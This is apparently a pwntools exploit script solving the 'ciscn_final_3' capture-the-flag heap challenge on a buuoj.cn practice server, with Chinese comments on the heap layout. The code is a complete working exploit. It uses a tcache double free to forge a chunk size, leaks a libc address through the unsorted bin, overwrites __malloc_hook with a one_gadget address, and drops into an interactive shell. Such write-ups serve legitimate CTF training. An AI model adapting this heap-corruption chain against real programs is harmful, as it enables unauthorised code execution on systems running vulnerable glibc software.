from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))

	return (system, binsh)


s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './ciscn_final_3'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',26501) if argv[1]=='r' else process(binary)
# p = remote('node4.buuoj.cn',29924) if argv[1]=='r' else process(binary,
#             env={"LD_PRELOAD":"/home/javayuan/pwn_libc合集/Ubuntu16_32/libc-2.23_32.so"})
#替换libc和ld
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# patchelf --set-interpreter /lib64/2_27-linux.so.2 ./pwn
# patchelf --replace-needed libc.so.6 /home/javayuan/pwn_libc合集/Ubuntu16_64/libc-2.23.so ./pwn  #libc.so.6为需要替换的libc路径 第二个参数是需要加载的glibc的目录    pwn 是二进制文件
# add-symbol-file /home/javayuan/glibc-all-in-one/debs/libc6-dbg_2.27-3ubuntu1_amd64.deb
# source /home/javayuan/pwn_libc合集/loadsym.py
# loadsym /path/to/usr/lib/debug/lib/x86_64-linux-gnu/libc-2.27.so

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def bytes2int(content):
	return str(content,encoding='utf-8')

def dbg():
	gdb.attach(p)
	pause()
# start
def add(index,len,content=b'a'):
    sla(b'2. remove',b'1')
    sla(b'index',int2bytes(index))
    sla(b'size',int2bytes(len))
    sa(b'something',content)
    ru(b'gift :')
    heap_addr = int(bytes2int(r(14)),16)
    return heap_addr

# def show(index):
#     sla(b':',b'3')
#     sla(b':',int2bytes(index))
#
# def edit(index,content):
#     sla(b':',b'2')
#     sla(b':',int2bytes(index))
#     sa(b':',content)

def delete(index):
    sla(b'2. remove',b'2')
    sla(b'index',int2bytes(index))

libc = ELF('./libc1.so.6')

ptr0 = add(0,0x60) # 0
add(1,0x20)# 1
add(2,0x78)# 2  #需要八个0x80
add(3,0x78)# 3
add(4,0x78)# 4
add(5,0x78)# 5
add(6,0x78)# 6
add(7,0x78)# 7
add(8,0x78)# 8
add(9,0x78)# 9 #防止释放chunk 0 时报错 --double free or corruption (!prev)
#上面这么多块是为了达到fake chunk size 420而申请的
#本来我自己写的时候就申请了四个chunk，但是用0x421修改后size后发现fake chunk处于free状态
#delete(0)报错，报错里面有(!prev)，没看源码了猜测是根据下一个块的prev位判断的，实验后发现果然是这样
add(10,0x10) # 10
# 注意这里还不能和chunk1 size相同
# 因为dup把0x30（chunk 1 size）的tache玩坏了，数量为-1，0xfffff……远大于7

#dup
delete(10)#tache
delete(10)#tache double free
add(11,0x10,p64(ptr0 - 0x10))# 11
add(12,0x10,p64(ptr0 - 0x10))# 12
add(13,0x10,p64(0)+p64(0x421))# 13 get chunk0->size，size需要超过0x400才能进unsortbin

#overlap
delete(0)#unsorted_bin chunk->fd=libc
delete(1)#tache

add(14,0x60)# 14 从unsortbin分下一块,后面依然在unsortbin里 chunk1->fd=libc
add(15,0x20)# 15
unsorted_bin = add(16,0x20)# 16
libc.address = unsorted_bin - 0x3ebca0
malloc_hook = libc.sym['__malloc_hook']
one_gadgets = [0x4f2c5,0x4f322,0x10a38c]
one_gadget = libc.address + one_gadgets[2]
log.success('libc_base:',hex(libc.address))

#dup
delete(6)
delete(6)
add(17,0x78,p64(malloc_hook))# 17
add(18,0x78,p64(malloc_hook))# 18
add(19,0x78,p64(one_gadget))# 19
#getshell
sla(b'2. remove', b'1')
sla(b'index', int2bytes(20))#
sla(b'size', int2bytes(0x10))
itr()